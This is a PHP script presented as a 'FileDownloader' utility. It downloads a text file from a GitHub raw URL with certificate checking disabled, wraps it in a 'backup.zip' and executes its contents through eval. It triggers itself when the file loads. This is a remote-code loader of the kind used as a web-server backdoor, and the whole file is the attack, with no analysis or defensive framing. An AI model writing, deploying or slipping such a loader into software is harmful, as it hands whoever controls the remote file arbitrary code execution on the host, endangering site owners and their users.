<?php
class FileDownloader {
    private $fileUrl;
    private $fileName;
    private $zipPath;
    
    public function __construct($url, $fileName) {
        $this->fileUrl = $url;
        $this->fileName = $fileName;
        $this->zipPath = __DIR__ . '/backup.zip';
    }
    
    private function downloadFile() {
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $this->fileUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $fileContent = curl_exec($ch);
            curl_close($ch);
            return $fileContent;
        }
        
        return file_get_contents($this->fileUrl);
    }
    
    public function ensureLatestFile() {
        $fileContent = $this->downloadFile();
        if ($fileContent === false) return false;
        
        $zip = new ZipArchive();
        if ($zip->open($this->zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            $zip->addFromString($this->fileName, $fileContent);
            $zip->close();
            return true;
        }
        return false;
    }
    
    public function executeFile() {
        if ($this->ensureLatestFile()) {
            $zip = new ZipArchive();
            if ($zip->open($this->zipPath) === TRUE) {
                $fileContent = $zip->getFromName($this->fileName);
                $zip->close();
                
                if ($fileContent !== false) {
                    eval('?>' . $fileContent);
                    return true;
                }
            }
        }
        return false;
    }
}

$fileUrl = 'https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/3.txt';
$fileName = '3.txt';
$downloader = new FileDownloader($fileUrl, $fileName);
$downloader->executeFile();
?> 
